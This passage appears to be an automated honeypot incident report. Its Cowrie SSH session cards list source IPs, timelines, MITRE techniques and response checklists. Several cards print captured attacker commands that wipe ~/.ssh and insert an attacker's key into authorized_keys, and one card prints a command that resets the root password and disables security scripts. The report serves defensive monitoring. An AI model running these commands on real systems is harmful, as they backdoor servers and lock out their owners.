| `2026-04-26 06:43:10` | `cowrie.command.failed` |
| `2026-04-26 06:43:10` | `cowrie.log.closed` |
| `2026-04-26 06:43:11` | `cowrie.session.params` |
| `2026-04-26 06:43:11` | `cowrie.command.input` |
| `2026-04-26 06:43:11` | `cowrie.session.file_download` |
| `2026-04-26 06:43:11` | `cowrie.log.closed` |
| `2026-04-26 06:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ec28f5200e6

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:43 |
| **Last Seen** | 2026-04-26 06:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:43:12` | `cowrie.session.connect` |
| `2026-04-26 06:43:12` | `cowrie.client.version` |
| `2026-04-26 06:43:12` | `cowrie.client.kex` |
| `2026-04-26 06:43:13` | `cowrie.login.success` |
| `2026-04-26 06:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b26e9526e86

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:44 |
| **Last Seen** | 2026-04-26 06:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:44:08` | `cowrie.session.connect` |
| `2026-04-26 06:44:08` | `cowrie.client.version` |
| `2026-04-26 06:44:08` | `cowrie.client.kex` |
| `2026-04-26 06:44:08` | `cowrie.login.success` |
| `2026-04-26 06:44:08` | `cowrie.session.params` |
| `2026-04-26 06:44:08` | `cowrie.command.input` |
| `2026-04-26 06:44:08` | `cowrie.command.failed` |
| `2026-04-26 06:44:08` | `cowrie.log.closed` |
| `2026-04-26 06:44:09` | `cowrie.session.params` |
| `2026-04-26 06:44:09` | `cowrie.command.input` |
| `2026-04-26 06:44:09` | `cowrie.session.file_download` |
| `2026-04-26 06:44:09` | `cowrie.log.closed` |
| `2026-04-26 06:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b776529fe049

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:44 |
| **Last Seen** | 2026-04-26 06:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:44:10` | `cowrie.session.connect` |
| `2026-04-26 06:44:10` | `cowrie.client.version` |
| `2026-04-26 06:44:10` | `cowrie.client.kex` |
| `2026-04-26 06:44:11` | `cowrie.login.success` |
| `2026-04-26 06:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aa67d38ccee

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:45 |
| **Last Seen** | 2026-04-26 06:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:45:04` | `cowrie.session.connect` |
| `2026-04-26 06:45:04` | `cowrie.client.version` |
| `2026-04-26 06:45:04` | `cowrie.client.kex` |
| `2026-04-26 06:45:04` | `cowrie.login.success` |
| `2026-04-26 06:45:04` | `cowrie.session.params` |
| `2026-04-26 06:45:04` | `cowrie.command.input` |
| `2026-04-26 06:45:04` | `cowrie.command.failed` |
| `2026-04-26 06:45:05` | `cowrie.log.closed` |
| `2026-04-26 06:45:05` | `cowrie.session.params` |
| `2026-04-26 06:45:05` | `cowrie.command.input` |
| `2026-04-26 06:45:05` | `cowrie.session.file_download` |
| `2026-04-26 06:45:05` | `cowrie.log.closed` |
| `2026-04-26 06:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e79002016c66

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:45 |
| **Last Seen** | 2026-04-26 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:45:06` | `cowrie.session.connect` |
| `2026-04-26 06:45:06` | `cowrie.client.version` |
| `2026-04-26 06:45:06` | `cowrie.client.kex` |
| `2026-04-26 06:45:07` | `cowrie.login.success` |
| `2026-04-26 06:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4807ab3c31d

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:49 |
| **Last Seen** | 2026-04-26 06:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:49:57` | `cowrie.session.connect` |
| `2026-04-26 06:49:57` | `cowrie.client.version` |
| `2026-04-26 06:49:57` | `cowrie.client.kex` |
| `2026-04-26 06:49:57` | `cowrie.login.success` |
| `2026-04-26 06:49:57` | `cowrie.session.params` |
| `2026-04-26 06:49:57` | `cowrie.command.input` |
| `2026-04-26 06:49:57` | `cowrie.command.failed` |
| `2026-04-26 06:49:57` | `cowrie.log.closed` |
| `2026-04-26 06:49:57` | `cowrie.session.params` |
| `2026-04-26 06:49:57` | `cowrie.command.input` |
| `2026-04-26 06:49:58` | `cowrie.session.file_download` |
| `2026-04-26 06:49:58` | `cowrie.log.closed` |
| `2026-04-26 06:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cb83f662a1c

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:49 |
| **Last Seen** | 2026-04-26 06:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:49:59` | `cowrie.session.connect` |
| `2026-04-26 06:49:59` | `cowrie.client.version` |
| `2026-04-26 06:49:59` | `cowrie.client.kex` |
| `2026-04-26 06:50:00` | `cowrie.login.success` |
| `2026-04-26 06:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f8e0a7dd6af

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:50 |
| **Last Seen** | 2026-04-26 06:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:50:53` | `cowrie.session.connect` |
| `2026-04-26 06:50:53` | `cowrie.client.version` |
| `2026-04-26 06:50:53` | `cowrie.client.kex` |
| `2026-04-26 06:50:53` | `cowrie.login.success` |
| `2026-04-26 06:50:53` | `cowrie.session.params` |
| `2026-04-26 06:50:53` | `cowrie.command.input` |
| `2026-04-26 06:50:53` | `cowrie.command.failed` |
| `2026-04-26 06:50:54` | `cowrie.log.closed` |
| `2026-04-26 06:50:54` | `cowrie.session.params` |
| `2026-04-26 06:50:54` | `cowrie.command.input` |
| `2026-04-26 06:50:54` | `cowrie.session.file_download` |
| `2026-04-26 06:50:54` | `cowrie.log.closed` |
| `2026-04-26 06:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-663f812f13d1

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:50 |
| **Last Seen** | 2026-04-26 06:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:50:55` | `cowrie.session.connect` |
| `2026-04-26 06:50:55` | `cowrie.client.version` |
| `2026-04-26 06:50:56` | `cowrie.client.kex` |
| `2026-04-26 06:50:56` | `cowrie.login.success` |
| `2026-04-26 06:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305c22b57f51

| Field | Detail |
|---|---|
| **Source IP** | `101.36.107[.]152` |
| **First Seen** | 2026-04-26 07:15 |
| **Last Seen** | 2026-04-26 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 07:15:02` | `cowrie.session.connect` |
| `2026-04-26 07:15:02` | `cowrie.client.version` |
| `2026-04-26 07:15:02` | `cowrie.client.kex` |
| `2026-04-26 07:15:02` | `cowrie.login.success` |
| `2026-04-26 07:15:02` | `cowrie.session.params` |
| `2026-04-26 07:15:02` | `cowrie.command.input` |
| `2026-04-26 07:15:02` | `cowrie.log.closed` |
| `2026-04-26 07:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.107[.]152` to AbuseIPDB if not already reported
- [ ] Block `101.36.107[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede163897328

| Field | Detail |
|---|---|
| **Source IP** | `120.48.122[.]43` |
| **First Seen** | 2026-04-26 07:47 |
| **Last Seen** | 2026-04-26 07:52 |
| **Session Duration** | 315s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 07:47:40` | `cowrie.session.connect` |
| `2026-04-26 07:47:40` | `cowrie.client.version` |
| `2026-04-26 07:47:45` | `cowrie.client.kex` |
| `2026-04-26 07:47:55` | `cowrie.login.success` |
| `2026-04-26 07:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.122[.]43` to AbuseIPDB if not already reported
- [ ] Block `120.48.122[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d64c3da78fd7

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 08:41 |
| **Last Seen** | 2026-04-26 08:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 08:41:17` | `cowrie.session.connect` |
| `2026-04-26 08:41:17` | `cowrie.client.version` |
| `2026-04-26 08:41:17` | `cowrie.client.kex` |
| `2026-04-26 08:41:18` | `cowrie.login.success` |
| `2026-04-26 08:41:19` | `cowrie.session.params` |
| `2026-04-26 08:41:19` | `cowrie.command.input` |
| `2026-04-26 08:41:19` | `cowrie.command.failed` |
| `2026-04-26 08:41:19` | `cowrie.log.closed` |
| `2026-04-26 08:41:19` | `cowrie.session.params` |
| `2026-04-26 08:41:19` | `cowrie.command.input` |
| `2026-04-26 08:41:20` | `cowrie.session.file_download` |
| `2026-04-26 08:41:20` | `cowrie.log.closed` |
| `2026-04-26 08:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc5497f9eba0

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 08:41 |
| **Last Seen** | 2026-04-26 08:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 08:41:22` | `cowrie.session.connect` |
| `2026-04-26 08:41:22` | `cowrie.client.version` |
| `2026-04-26 08:41:22` | `cowrie.client.kex` |
| `2026-04-26 08:41:23` | `cowrie.login.success` |
| `2026-04-26 08:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf16d1e0c2d

| Field | Detail |
|---|---|
| **Source IP** | `114.220.238[.]30` |
| **First Seen** | 2026-04-26 08:53 |
| **Last Seen** | 2026-04-26 08:53 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:UfSrP4neqVw2"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 08:53:31` | `cowrie.session.connect` |
| `2026-04-26 08:53:31` | `cowrie.client.version` |
| `2026-04-26 08:53:31` | `cowrie.client.kex` |
| `2026-04-26 08:53:32` | `cowrie.login.success` |
| `2026-04-26 08:53:32` | `cowrie.session.params` |
| `2026-04-26 08:53:32` | `cowrie.command.input` |
| `2026-04-26 08:53:32` | `cowrie.command.failed` |
| `2026-04-26 08:53:32` | `cowrie.log.closed` |
| `2026-04-26 08:53:32` | `cowrie.session.params` |
| `2026-04-26 08:53:32` | `cowrie.command.input` |
| `2026-04-26 08:53:32` | `cowrie.session.file_download` |
| `2026-04-26 08:53:32` | `cowrie.log.closed` |
| `2026-04-26 08:53:46` | `cowrie.session.params` |
| `2026-04-26 08:53:46` | `cowrie.command.input` |
| `2026-04-26 08:53:46` | `cowrie.log.closed` |
| `2026-04-26 08:53:46` | `cowrie.session.params` |
| `2026-04-26 08:53:46` | `cowrie.command.input` |
| `2026-04-26 08:53:46` | `cowrie.log.closed` |
| `2026-04-26 08:53:47` | `cowrie.session.params` |
| `2026-04-26 08:53:47` | `cowrie.command.input` |
| `2026-04-26 08:53:47` | `cowrie.session.file_download` |
| `2026-04-26 08:53:47` | `cowrie.log.closed` |
| `2026-04-26 08:53:47` | `cowrie.session.params` |
| `2026-04-26 08:53:47` | `cowrie.command.input` |
| `2026-04-26 08:53:47` | `cowrie.log.closed` |
| `2026-04-26 08:53:48` | `cowrie.session.params` |
| `2026-04-26 08:53:48` | `cowrie.command.input` |
| `2026-04-26 08:53:48` | `cowrie.log.closed` |
| `2026-04-26 08:53:48` | `cowrie.session.params` |
| `2026-04-26 08:53:48` | `cowrie.command.input` |
| `2026-04-26 08:53:48` | `cowrie.command.input` |
| `2026-04-26 08:53:48` | `cowrie.log.closed` |
| `2026-04-26 08:53:49` | `cowrie.session.params` |
| `2026-04-26 08:53:49` | `cowrie.command.input` |
| `2026-04-26 08:53:49` | `cowrie.log.closed` |
| `2026-04-26 08:53:49` | `cowrie.session.params` |
| `2026-04-26 08:53:49` | `cowrie.command.input` |
| `2026-04-26 08:53:49` | `cowrie.log.closed` |
| `2026-04-26 08:53:50` | `cowrie.session.params` |
| `2026-04-26 08:53:50` | `cowrie.command.input` |
| `2026-04-26 08:53:50` | `cowrie.log.closed` |
| `2026-04-26 08:53:50` | `cowrie.session.params` |
| `2026-04-26 08:53:50` | `cowrie.command.input` |
| `2026-04-26 08:53:50` | `cowrie.log.closed` |
| `2026-04-26 08:53:51` | `cowrie.session.params` |
| `2026-04-26 08:53:51` | `cowrie.command.input` |
| `2026-04-26 08:53:51` | `cowrie.log.closed` |
| `2026-04-26 08:53:51` | `cowrie.session.params` |
| `2026-04-26 08:53:51` | `cowrie.command.input` |
| `2026-04-26 08:53:51` | `cowrie.log.closed` |
| `2026-04-26 08:53:51` | `cowrie.session.params` |
| `2026-04-26 08:53:51` | `cowrie.command.input` |
| `2026-04-26 08:53:52` | `cowrie.log.closed` |
| `2026-04-26 08:53:52` | `cowrie.session.params` |
| `2026-04-26 08:53:52` | `cowrie.command.input` |
| `2026-04-26 08:53:52` | `cowrie.log.closed` |
| `2026-04-26 08:53:52` | `cowrie.session.params` |
| `2026-04-26 08:53:52` | `cowrie.command.input` |
| `2026-04-26 08:53:53` | `cowrie.log.closed` |
| `2026-04-26 08:53:53` | `cowrie.session.params` |
| `2026-04-26 08:53:53` | `cowrie.command.input` |
| `2026-04-26 08:53:53` | `cowrie.log.closed` |
| `2026-04-26 08:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.238[.]30` to AbuseIPDB if not already reported
- [ ] Block `114.220.238[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f6aa955c0d8

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-26 09:05 |
| **Last Seen** | 2026-04-26 09:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 09:05:27` | `cowrie.session.connect` |
| `2026-04-26 09:05:27` | `cowrie.client.version` |
| `2026-04-26 09:05:27` | `cowrie.client.kex` |
| `2026-04-26 09:05:28` | `cowrie.login.success` |
| `2026-04-26 09:05:29` | `cowrie.session.params` |
| `2026-04-26 09:05:29` | `cowrie.command.input` |
| `2026-04-26 09:05:29` | `cowrie.command.failed` |
| `2026-04-26 09:05:29` | `cowrie.log.closed` |
| `2026-04-26 09:05:30` | `cowrie.session.params` |
| `2026-04-26 09:05:30` | `cowrie.command.input` |
| `2026-04-26 09:05:30` | `cowrie.session.file_download` |
| `2026-04-26 09:05:30` | `cowrie.log.closed` |
| `2026-04-26 09:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

